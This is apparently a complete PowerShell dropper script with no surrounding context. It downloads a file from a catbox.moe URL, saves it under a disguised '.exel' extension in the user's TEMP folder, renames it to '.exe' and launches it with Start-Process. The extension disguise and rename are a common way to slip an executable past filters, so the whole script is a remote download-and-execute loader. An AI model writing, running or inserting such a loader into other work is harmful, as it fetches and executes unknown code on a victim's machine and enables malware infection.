$url = "https://files.catbox.moe/uy96rs.exel"
$downloadPath = "$env:TEMP\uy96rs.exel"
$exePath = "$env:TEMP\uy96rs.exe"
Invoke-WebRequest -Uri $url -OutFile $downloadPath
Rename-Item -Path $downloadPath -NewName $exePath
Start-Process -FilePath $exePath
